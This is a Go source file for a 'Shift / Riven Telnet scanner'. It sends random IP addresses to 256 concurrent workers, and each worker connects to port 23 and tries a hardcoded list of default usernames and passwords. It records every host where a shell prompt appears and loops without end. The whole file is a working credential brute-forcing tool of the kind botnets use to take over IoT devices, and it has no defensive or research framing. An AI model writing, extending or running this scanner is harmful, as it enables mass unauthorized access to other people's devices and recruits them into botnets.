package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type Scanner struct {
	queueSize  int64
	hostQueue  chan string
	validCount int64
	invalidCount int64
}

var (
	stdinDone = make(chan bool)
	CREDENTIALS = []struct {
		Username string
		Password string
	}{
		{"root", "root"},
		{"root", ""},
		{"admin", "admin"},
		{"user", "user"},
		{"root", "12345"},
		{"admin", "1234"},
		{"admin", "password"},
	}
)

func loadPrefixes(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("[ERROR] Failed to open prefix file: %s\n", err)
		return nil
	}
	defer file.Close()

	var prefixes []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if len(line) > 0 && !strings.HasPrefix(line, "#") {
			prefixes = append(prefixes, line)
		}
	}
	if err := scanner.Err(); err != nil {
		fmt.Printf("[ERROR] Failed to read prefix file: %s\n", err)
	}
	return prefixes
}

func generateRandomIP(prefixes []string) string {
	if len(prefixes) == 0 {
		return ""
	}
	prefix := prefixes[rand.Intn(len(prefixes))]
	parts := strings.Split(prefix, ".")
	if len(parts) != 2 {
		return ""
	}
	return fmt.Sprintf("%s.%s.%d.%d", parts[0], parts[1], rand.Intn(256), rand.Intn(256))
}

func (s *Scanner) startWorkers(workers int, wg *sync.WaitGroup) {
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for ip := range s.hostQueue {
				s.scanHost(ip)
				atomic.AddInt64(&s.queueSize, -1)
			}
		}(i)
	}
}

func (s *Scanner) scanHost(ip string) {
	conn, err := net.DialTimeout("tcp", ip+":23", 5*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	conn.SetReadDeadline(time.Now().Add(5 * time.Second))

	for _, cred := range CREDENTIALS {
		// Simulasi login Telnet
		conn.Write([]byte(cred.Username + "\n"))
		time.Sleep(500 * time.Millisecond)
		conn.Write([]byte(cred.Password + "\n"))

		buf := make([]byte, 1024)
		n, _ := conn.Read(buf)
		out := string(buf[:n])
		if strings.Contains(out, "#") || strings.Contains(out, "$") {
			fmt.Printf("[VALID] %s:%s:%s\n", ip, cred.Username, cred.Password)
			atomic.AddInt64(&s.validCount, 1)
			return
		}
	}
	atomic.AddInt64(&s.invalidCount, 1)
}

func main() {
	rand.Seed(time.Now().UnixNano())
	s := &Scanner{
		hostQueue: make(chan string, 4096),
	}

	numThreads := 256
	var wg sync.WaitGroup

	fmt.Println("Shift / Riven Telnet scanner")
	fmt.Printf("Total CPU cores: %d\n", numThreads)

	s.startWorkers(numThreads, &wg)

	for {
		prefixes := loadPrefixes("prefix.txt")
		if len(prefixes) == 0 {
			fmt.Println("[!] No prefixes loaded, waiting 10 seconds...")
			time.Sleep(10 * time.Second)
			continue
		}

		go func() {
			hostCount := 0
			for i := 0; i < 10000; i++ {
				ip := generateRandomIP(prefixes)
				if ip == "" {
					continue
				}
				ip = strings.TrimSpace(ip)
				if ip == "" || strings.HasPrefix(ip, "#") {
					continue
				}
				atomic.AddInt64(&s.queueSize, 1)
				hostCount++

				select {
				case s.hostQueue <- ip:
				default:
					time.Sleep(10 * time.Millisecond)
					s.hostQueue <- ip
				}
			}
			fmt.Printf("Finished reading input: %d hosts queued\n", hostCount)
			stdinDone <- true
		}()

		<-stdinDone

		for {
			if atomic.LoadInt64(&s.queueSize) == 0 {
				break
			}
			time.Sleep(2 * time.Second)
		}

		fmt.Println("\nScan complete!")
		fmt.Printf("Total scanned: %d\n", s.validCount + s.invalidCount)
		fmt.Printf("Valid logins found: %d\n", s.validCount)
		fmt.Printf("Invalid attempts: %d\n", s.invalidCount)
		fmt.Println("[!] Scanner cycle completed, restarting in 3 seconds...\n")
		time.Sleep(3 * time.Second)
	}
}
